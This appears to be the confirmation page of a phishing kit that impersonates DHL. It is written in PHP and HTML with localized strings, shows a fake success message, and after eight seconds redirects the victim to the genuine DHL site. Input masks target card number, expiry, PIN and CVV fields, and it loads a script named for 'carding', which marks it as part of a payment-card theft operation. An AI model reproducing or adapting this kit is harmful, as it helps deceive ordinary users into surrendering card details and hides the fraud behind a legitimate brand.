<!doctype html>
<?php 

include('./sourecApp/funciones.php');
$lang = getLocation();
include_once('./sourecApp/lang/'.$lang);

?>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<script src="https://kit.fontawesome.com/8cb6f1f1f2.js" crossorigin="anonymous"></script>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="sourecApp/style/style_019.css">
<link rel="stylesheet" type="text/css" href="sourecApp/style/style_022.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<meta http-equiv="refresh" content="8;url=https://www.dhl.com/en/contact_center/contact_express.html" />


    <title><?php echo lang('Title_page'); ?></title>
  </head>
  <body>
     <div id="loadingo9lawzan" class="bg-loadingo9lawzan" ><div class="lawzan"></div></div>
    <div class="topnav" id="myTopnav">
  <a href="" ><img src="sourecApp/style/dhl-logo.svg" alt="Retour à l’accueil"></a>
  <a href="" class="jnb"><i class="fas fa-search"></i>&nbsp;<?php echo lang('Min_i3'); ?></a>
  <a href="" class="jnb"><i class="fas fa-globe"></i>&nbsp;<?php echo lang('Min_i2'); ?></a>
  <a href="" class="jnb"><i class="fas fa-exclamation-circle"></i>&nbsp;<?php echo lang('Min_i1'); ?></a>

  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
   <i class="fas fa-search boldcon"></i>&nbsp; <i class="fas fa-globe boldcon"></i>&nbsp;<i class="fas fa-bars boldcon"></i>
  </a>
</div>
    <div class="topnavtow" id="myTopnav">
   <a href="" ><?php echo lang('Ming_i1'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i2'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i3'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i4'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
</div>
<main role="main" class="flex-shrink-0">

<div class="container">
<center>
  <h1 class="dhl_gtext"><?php echo lang('Text_i1'); ?></h1>
    <span><?php echo lang('Text_i2'); ?></span> </br> 
    <span><?php echo lang('Text_i3'); ?></span> 
</center>

<div class="row box_billing">
<div  style="background-color: #dff0d8;color: #3c763d;border-radius:10px;max-width:500px;text-align:center;padding:10px;margin: 0 auto;">
      <img  src="sourecApp/style/ok.svg"><br><?php echo lang('text_succ'); ?></div>
</div>


</div>



    </main>
<br>
<br>
<br>
<!-- Footer -->
<footer class="page-footer font-small teal pt-4" style="background: #f1f1f1;">
  <div class="container-fluid text-center text-md-left">
    <div class="row">
      <div class="col-md-6 mt-md-0 mt-3">
        <h5 class="text-uppercase font-weight-bold text_footer"><?php echo lang('Footer_title1'); ?></h5>
        <div class="list-one">
  <a href="#"><?php echo lang('Footer_text1'); ?></a>
  <a href="#"><?php echo lang('Footer_text2'); ?></a>
  <a href="#"><?php echo lang('Footer_text3'); ?></a>
  <a href="#"><?php echo lang('Footer_text4'); ?></a>
  <a href="#"><?php echo lang('Footer_text5'); ?></a>
  <a href="#"><?php echo lang('Footer_text6'); ?></a>
  <a href="#"><?php echo lang('Footer_text7'); ?></a>
  <a href="#"><?php echo lang('Footer_text8'); ?></a>
</div>



      </div>
      <hr class="clearfix w-100 d-md-none pb-3">
      <div class="col-md-6 mb-md-0 mb-3">
        <h5 class="text-uppercase font-weight-bold text_footer" ><?php echo lang('Footer_title2'); ?></h5>
        <div class="list-one">
  <a href="#"><img class="imgicon" src="sourecApp/style/youtube-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/facebook-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/linkedIn-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/instagram-new.svg" ></a>
</div>
      </div>
    </div>
  </div>
  <div class="footer-copyright text-center py-3 text_rights"><?php echo lang('Footer_rights'); ?>
  </div>
</footer>
<!-- Footer -->

<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>

<script type="text/javascript">
    $(":input").inputmask();
    $("#Kartennummer").inputmask({"mask": "9999 9999 9999 9999"});
    $("#Ablauf").inputmask({"mask": "99/9999"});
    $("#pinscode").inputmask({"mask": "9999"});
    $("#Sicherheitscode").inputmask({"mask": "999"});
</script>
<script  src="sourecApp/style/Java_onfunc_carding.js"></script>
  </body>
</html>